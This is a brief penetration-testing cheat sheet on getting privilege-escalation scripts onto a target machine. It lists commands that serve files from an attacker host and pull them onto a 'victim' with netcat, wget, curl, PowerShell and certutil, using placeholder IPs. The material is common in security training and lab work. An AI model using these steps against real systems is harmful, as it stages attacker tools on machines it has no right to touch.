# Privilege Escalation

## Transfer Scripts

### Start Local Server:

#### Apache2

> - Copy scripts to `/var/www/html`
> - `sudo systemctl start apache2`

#### SimpleHTTPServer

> Python2
> - `python2 -m SimpleHTTPServer <port>`
>
> Python3
> - `python3 -m http.server <port>`

### Download Scripts:

#### Linux

#### Without Server:

> - Victim: `nc -nvlp <port> > <script>`
> - Attacker: `nc -nv <ip> <port> < <script>`

#### With Server:

> - `wget http://<ip>/<script>`
> - `curl http://<ip>/<script> -o <script>`

#### Windows

#### With Server:

> - `Invoke-WebRequest http://<ip>/<script> -OutFile <script>`
> - `certutil.exe -urlcache -split -f "http://<ip>/<script>" <script>`
